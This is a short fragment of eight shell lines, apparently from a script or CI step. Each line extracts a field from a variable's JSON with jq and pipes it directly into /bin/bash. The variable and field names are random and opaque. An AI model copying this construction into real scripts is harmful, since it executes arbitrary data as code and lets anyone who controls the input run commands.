          printf '%s' "$qcz3492" | jq -r .trot777 | /bin/bash
          echo $lfms72 | jq -r .cwde32230 | /bin/bash
          echo $xui12 | jq -r .kadl11266 | /bin/bash
          printf '%s' "$wmi56" | jq -r .rlws627 | /bin/bash
          printf '%s' "$oxkzi3407" | jq -r .ktztw64 | /bin/bash
          echo $cqgp253 | jq -r .hhis38 | /bin/bash
          printf '%s' "$yt714" | jq -r .desbb37004 | /bin/bash
          printf '%s' "$zn814" | jq -r .dxj3090 | /bin/bash

